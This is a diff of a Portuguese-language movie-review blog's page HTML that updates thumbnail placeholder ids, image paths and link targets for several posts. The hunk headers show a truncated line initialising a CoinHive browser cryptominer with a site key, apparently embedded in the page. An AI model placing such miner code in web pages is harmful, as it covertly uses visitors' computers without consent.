@@ -739,18 +786,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7544" title="+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed696be" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d04ef" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed696be' ).animateSvg();
+                $( '#59bd5de8d04ef' ).animateSvg();
               });
-            } else { $( '#59bb7fed696be' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d04ef' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷" data-hu-post-id="59bb7fed696be" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷" data-hu-post-id="59bd5de8d04ef" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -766,7 +813,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7544" rel="bookmark" title="+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷" target="_blank">+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷</a>
+			<a href="/archives/7544" rel="bookmark" title="+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷">+ 10 TÍTULOS BR melhores que os ORIGINAIS! 🇺🇸 🔁 🇧🇷</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -779,18 +826,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7511" title="BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed6c4c8" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d1d7a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed6c4c8' ).animateSvg();
+                $( '#59bd5de8d1d7a' ).animateSvg();
               });
-            } else { $( '#59bb7fed6c4c8' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d1d7a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor" data-hu-post-id="59bb7fed6c4c8" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor" data-hu-post-id="59bd5de8d1d7a" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -806,7 +853,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7511" rel="bookmark" title="BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor" target="_blank">BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor</a>
+			<a href="/archives/7511" rel="bookmark" title="BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor">BINGO (filme do BOZO) 🤡 &#8211; OPINIÃO + Entrevista com diretor</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -819,18 +866,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7505" title="15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed6f45f" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d3b2b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed6f45f' ).animateSvg();
+                $( '#59bd5de8d3b2b' ).animateSvg();
               });
-            } else { $( '#59bb7fed6f45f' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d3b2b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀" data-hu-post-id="59bb7fed6f45f" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀" data-hu-post-id="59bd5de8d3b2b" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -846,7 +893,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7505" rel="bookmark" title="15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀" target="_blank">15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀</a>
+			<a href="/archives/7505" rel="bookmark" title="15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀">15 SÉRIES e atores ESQUECIDOS pelo EMMY! 😭 👀</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -859,18 +906,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7479" title="ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed72b00" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d5338" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed72b00' ).animateSvg();
+                $( '#59bd5de8d5338' ).animateSvg();
               });
-            } else { $( '#59bb7fed72b00' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d5338' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento" data-hu-post-id="59bb7fed72b00" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento" data-hu-post-id="59bd5de8d5338" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -886,7 +933,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7479" rel="bookmark" title="ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento" target="_blank">ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento</a>
+			<a href="/archives/7479" rel="bookmark" title="ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento">ATÔMICA &#8211; Crítica do Filme de Espionagem &#8211; 🍿 &#8211; Nerd Rabugento</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -899,18 +946,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7463" title="DEATH NOTE (Netflix, 2017) &#8211; Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed755a4" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d6b23" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed755a4' ).animateSvg();
+                $( '#59bd5de8d6b23' ).animateSvg();
               });
-            } else { $( '#59bb7fed755a4' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d6b23' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="DEATH NOTE (Netflix, 2017) &#8211; Crítica" data-hu-post-id="59bb7fed755a4" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="DEATH NOTE (Netflix, 2017) &#8211; Crítica" data-hu-post-id="59bd5de8d6b23" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -926,7 +973,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7463" rel="bookmark" title="DEATH NOTE (Netflix, 2017) &#8211; Crítica" target="_blank">DEATH NOTE (Netflix, 2017) &#8211; Crítica</a>
+			<a href="/archives/7463" rel="bookmark" title="DEATH NOTE (Netflix, 2017) &#8211; Crítica">DEATH NOTE (Netflix, 2017) &#8211; Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -939,18 +986,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7449" title="10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed78057" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8d87f9" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed78057' ).animateSvg();
+                $( '#59bd5de8d87f9' ).animateSvg();
               });
-            } else { $( '#59bb7fed78057' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8d87f9' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀" data-hu-post-id="59bb7fed78057" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀" data-hu-post-id="59bd5de8d87f9" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -966,7 +1013,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7449" rel="bookmark" title="10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀" target="_blank">10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀</a>
+			<a href="/archives/7449" rel="bookmark" title="10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀">10 Personagens mais MISTERIOSOS do CINEMA! 😱  👀</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -979,18 +1026,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7426" title="Polícia Federal &#8211; A Lei é para Todos: Comentários">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed7b3f9" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8da13b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed7b3f9' ).animateSvg();
+                $( '#59bd5de8da13b' ).animateSvg();
               });
-            } else { $( '#59bb7fed7b3f9' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8da13b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Polícia Federal &#8211; A Lei é para Todos: Comentários" data-hu-post-id="59bb7fed7b3f9" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Polícia Federal &#8211; A Lei é para Todos: Comentários" data-hu-post-id="59bd5de8da13b" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1006,7 +1053,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7426" rel="bookmark" title="Polícia Federal &#8211; A Lei é para Todos: Comentários" target="_blank">Polícia Federal &#8211; A Lei é para Todos: Comentários</a>
+			<a href="/archives/7426" rel="bookmark" title="Polícia Federal &#8211; A Lei é para Todos: Comentários">Polícia Federal &#8211; A Lei é para Todos: Comentários</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1019,18 +1066,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7415" title="+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed7e6e9" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8dc675" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed7e6e9' ).animateSvg();
+                $( '#59bd5de8dc675' ).animateSvg();
               });
-            } else { $( '#59bb7fed7e6e9' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8dc675' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔" data-hu-post-id="59bb7fed7e6e9" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔" data-hu-post-id="59bd5de8dc675" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -1046,7 +1093,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7415" rel="bookmark" title="+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔" target="_blank">+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔</a>
+			<a href="/archives/7415" rel="bookmark" title="+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔">+ 7 Filmes mais DEPRESSIVOS! (QUERIA ESTAR MORTA) 😭 💔</a>
